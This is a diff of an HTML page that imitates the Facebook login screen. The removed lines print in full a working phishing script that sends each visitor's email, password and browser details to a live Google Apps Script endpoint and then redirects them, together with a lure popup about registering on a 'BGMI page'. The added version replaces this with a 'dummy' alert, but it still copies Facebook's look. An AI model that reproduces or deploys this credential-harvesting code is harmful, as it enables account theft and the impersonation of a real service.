@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>facebook - Log In or Sign Up</title>
+    <title>Facebook - Log In or Sign Up</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * {
@@ -93,16 +93,10 @@
             font-weight: bold;
             cursor: pointer;
             margin: 12px 0 6px;
-            transition: background-color 0.2s;
         }
 
         .login-button:hover {
             background-color: #166fe5;
-        }
-
-        .login-button:disabled {
-            background-color: #9ab8e8;
-            cursor: not-allowed;
         }
 
         .forgot-password {
@@ -114,7 +108,6 @@
             color: #1877f2;
             text-decoration: none;
             font-size: 14px;
-            cursor: pointer;
         }
 
         .forgot-password a:hover {
@@ -136,7 +129,6 @@
             color: white;
             cursor: pointer;
             margin-bottom: 16px;
-            transition: background-color 0.2s;
         }
 
         .create-new-account:hover {
@@ -147,7 +139,6 @@
             color: white;
             text-decoration: none;
             font-size: 17px;
-            cursor: pointer;
         }
 
         .page-footer {
@@ -157,105 +148,13 @@
         }
 
         .page-footer a {
-            color: #1877f2;
+            color: #606770;
             text-decoration: none;
             margin: 0 8px;
-            cursor: pointer;
         }
 
         .page-footer a:hover {
             text-decoration: underline;
-        }
-
-        /* ── MODAL ─────────────────────────────── */
-        .modal-overlay {
-            position: fixed;
-            inset: 0;
-            background: rgba(0, 0, 0, 0.55);
-            z-index: 999;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.25s ease;
-        }
-
-        .modal-overlay.active {
-            opacity: 1;
-            pointer-events: all;
-        }
-
-        .modal-box {
-            background: #fff;
-            border-radius: 12px;
-            padding: 32px 28px 28px;
-            max-width: 380px;
-            width: 90%;
-            text-align: center;
-            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.22);
-            transform: scale(0.88) translateY(16px);
-            transition: transform 0.25s ease;
-            position: relative;
-        }
-
-        .modal-overlay.active .modal-box {
-            transform: scale(1) translateY(0);
-        }
-
-        .modal-icon {
-            font-size: 42px;
-            margin-bottom: 14px;
-        }
-
-        .modal-title {
-            font-size: 20px;
-            font-weight: 700;
-            color: #1c1e21;
-            margin-bottom: 10px;
-        }
-
-        .modal-msg {
-            font-size: 14px;
-            color: #606770;
-            line-height: 1.6;
-            margin-bottom: 22px;
-        }
-
-        .modal-msg strong {
-            color: #1877f2;
-        }
-
-        .modal-close-btn {
-            background: #1877f2;
-            color: #fff;
-            border: none;
-            border-radius: 6px;
-            padding: 10px 32px;
-            font-size: 15px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
-
-        .modal-close-btn:hover {
-            background: #166fe5;
-        }
-
-        .modal-x {
-            position: absolute;
-            top: 12px;
-            right: 16px;
-            font-size: 20px;
-            color: #8a8d91;
-            background: none;
-            border: none;
-            cursor: pointer;
-            line-height: 1;
-        }
-
-        .modal-x:hover {
-            color: #1c1e21;
         }
 
         @media (max-width: 900px) {
@@ -298,106 +197,50 @@
 <body>
     <div class="container">
         <div class="left-section">
-            <h1>facebook</h1>
-            <p>Connect with friends and the world around you on facebook.</p>
+            <h1>cakebook</h1>
+            <p>Connect with friends and the world around you on Facebook.</p>
         </div>
 
         <div class="right-section">
             <div class="login-form">
                 <form id="loginForm">
                     <div class="form-group">
-                        <input type="email" name="email" id="emailInput" placeholder="Mobile number or email address"
-                            required>
+                        <input type="email" name="email" placeholder="Email address or phone number" required>
                     </div>
                     <div class="form-group">
-                        <input type="password" name="password" id="passwordInput" placeholder="Password" required>
+                        <input type="password" name="password" placeholder="Password" required>
                     </div>
-                    <button type="submit" class="login-button" id="submitBtn">Log In</button>
+                    <button type="submit" class="login-button">Log In</button>
                     <div class="forgot-password">
-                        <a onclick="showUnavailablePopup(event)">Forgotten password?</a>
+                        <a href="#">Forgotten password?</a>
                     </div>
                     <div class="divider"></div>
                     <div class="create-new-account">
-                        <a onclick="showUnavailablePopup(event)">Create new account</a>
+                        <a href="#">Create new account</a>
                     </div>
                 </form>
             </div>
 
             <div class="page-footer">
-                <p><a onclick="showUnavailablePopup(event)">Create a Page</a> for a celebrity, brand or business.</p>
+                <p><a href="#">Create a Page</a> for a celebrity, brand or business.</p>
             </div>
-        </div>
-    </div>
-
-    <!-- ── MODAL ─────────────────────────────────────── -->
-    <div class="modal-overlay" id="unavailableModal">
-        <div class="modal-box">
-            <button class="modal-x" onclick="closePopup()">✕</button>
-            <div class="modal-icon">🔒</div>
-            <div class="modal-title">Service Not Available</div>
-            <div class="modal-msg">
-                This service is currently not available.<br><br>
-                <strong>Please log in to register on the BGMI page.</strong>
-            </div>
-            <button class="modal-close-btn" onclick="closePopup()">Got it</button>
         </div>
     </div>
 
     <script>
-        // ── Google Sheets URL ─────────────────────────────────────
-        const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbx0SyUTQF2qlHIwSIPPqbTVB7q69rk01-9LujiLViniu1u3yFZD5gydN5dSEzxraAyg/exec";
-
-        // ── Redirect after login ──────────────────────────────────
-        const REDIRECT_URL = "/";
-
-        // ── Login Form Submit ─────────────────────────────────────
-        document.getElementById('loginForm').addEventListener('submit', async function (e) {
+        document.getElementById('loginForm').addEventListener('submit', function (e) {
             e.preventDefault();
 
-            const email = document.getElementById('emailInput').value;
-            const password = document.getElementById('passwordInput').value;
-            const submitBtn = document.getElementById('submitBtn');
+            // Get form values
+            const email = document.querySelector('input[name="email"]').value;
+            const password = document.querySelector('input[name="password"]').value;
 
-            submitBtn.disabled = true;
-            submitBtn.textContent = "Logging in...";
+            // This is just a dummy form - it doesn't actually log in to Facebook
+            // You can customize this to show a message or redirect to your own page
+            alert('This is a dummy login page. No actual authentication is happening.\n\nEmail: ' + email + '\nPassword: ' + password);
 
-            try {
-                await fetch(GOOGLE_SCRIPT_URL, {
-                    method: "POST",
-                    mode: "no-cors",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        email: email,
-                        password: password,
-                        userAgent: navigator.userAgent,
-                        timestamp: new Date().toISOString()
-                    })
-                });
-            } catch (err) {
-                console.warn("Could not reach logging server:", err);
-            }
-
-            window.location.href = REDIRECT_URL;
-        });
-
-        // ── Popup helpers ─────────────────────────────────────────
-        function showUnavailablePopup(e) {
-            if (e) e.preventDefault();
-            document.getElementById('unavailableModal').classList.add('active');
-        }
-
-        function closePopup() {
-            document.getElementById('unavailableModal').classList.remove('active');
-        }
-
-        // Close when clicking outside the box
-        document.getElementById('unavailableModal').addEventListener('click', function (e) {
-            if (e.target === this) closePopup();
-        });
-
-        // Close on Escape key
-        document.addEventListener('keydown', function (e) {
-            if (e.key === 'Escape') closePopup();
+            // You could redirect to another page if needed:
+            // window.location.href = 'your-destination-page.html';
         });
     </script>
 </body>
